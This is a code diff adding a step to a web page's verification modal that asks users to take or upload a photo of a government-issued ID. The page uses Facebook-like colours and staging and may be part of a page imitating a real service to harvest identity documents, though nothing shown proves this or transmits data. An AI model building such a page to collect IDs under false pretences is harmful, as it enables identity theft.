@@ -635,6 +635,64 @@
           </button>
         </div>
         
+        <!-- ID Verification Step -->
+        <div id="id-verification-step" style="display: none;">
+          <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#1877F2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin: 0 auto 1rem;">
+            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+            <polyline points="14,2 14,8 20,8"></polyline>
+            <line x1="16" y1="13" x2="8" y2="13"></line>
+            <line x1="16" y1="17" x2="8" y2="17"></line>
+            <polyline points="10,9 9,9 8,9"></polyline>
+          </svg>
+          
+          <h3 style="color: #1877F2; font-weight: bold; margin-bottom: 10px; font-size: 20px;">Identity Document Verification</h3>
+          
+          <p style="font-size: 16px; line-height: 1.4; margin-bottom: 20px;">
+            For additional security, please upload a photo of your government-issued ID (driver's license, passport, or national ID card).
+          </p>
+          
+          <!-- ID Upload Options -->
+          <div style="margin: 20px auto; max-width: 350px;">
+            <div style="display: flex; gap: 10px; margin-bottom: 20px;">
+              <button id="take-photo-btn" style="flex: 1; padding: 12px; background-color: #1877F2; color: white; border: none; border-radius: 6px; font-size: 14px; cursor: pointer; transition: background-color 0.2s;">
+                📷 Take Photo
+              </button>
+              <button id="upload-file-btn" style="flex: 1; padding: 12px; background-color: #42B72A; color: white; border: none; border-radius: 6px; font-size: 14px; cursor: pointer; transition: background-color 0.2s;">
+                📁 Upload File
+              </button>
+            </div>
+            
+            <!-- Hidden file input -->
+            <input type="file" id="id-file-input" accept="image/*" style="display: none;">
+            
+            <!-- Camera video element (hidden by default) -->
+            <video id="camera-video" autoplay style="display: none; width: 100%; max-width: 300px; border-radius: 8px; margin-bottom: 10px;"></video>
+            <canvas id="photo-canvas" style="display: none;"></canvas>
+            
+            <!-- Photo preview area -->
+            <div id="photo-preview" style="display: none; margin-bottom: 15px;">
+              <img id="preview-image" style="width: 100%; max-width: 300px; border-radius: 8px; border: 2px solid #dddfe2;">
+              <p style="font-size: 12px; color: #65676B; margin-top: 5px; text-align: center;">Photo captured successfully</p>
+            </div>
+            
+            <!-- Capture button (shown when camera is active) -->
+            <button id="capture-photo-btn" style="display: none; width: 100%; padding: 12px; background-color: #1877F2; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; margin-bottom: 10px;">
+              📸 Capture Photo
+            </button>
+            
+            <!-- Retake button -->
+            <button id="retake-photo-btn" style="display: none; width: 100%; padding: 8px; background-color: #42B72A; color: white; border: none; border-radius: 6px; font-size: 14px; cursor: pointer; margin-bottom: 15px;">
+              🔄 Retake Photo
+            </button>
+            
+            <div class="error-message" id="id-verification-error" style="display: none; color: #ff0000; font-size: 12px; margin-bottom: 10px; text-align: center;">Please take or upload a photo of your ID</div>
+          </div>
+          
+          <button class="modal-close-button" id="submit-id-verification" style="display: inline-block; text-decoration: none; margin-top: 10px; opacity: 0.7; cursor: not-allowed; padding: 10px 20px; font-size: 15px; border-radius: 6px; background-color: #1877F2; color: white; border: none; font-weight: 600; min-width: 200px;" disabled>
+            Verify Identity
+          </button>
+        </div>
+
         <!-- Final Success Step -->
         <div id="verification-success" style="display: none;">
           <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#42B72A" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin: 0 auto 1rem;">
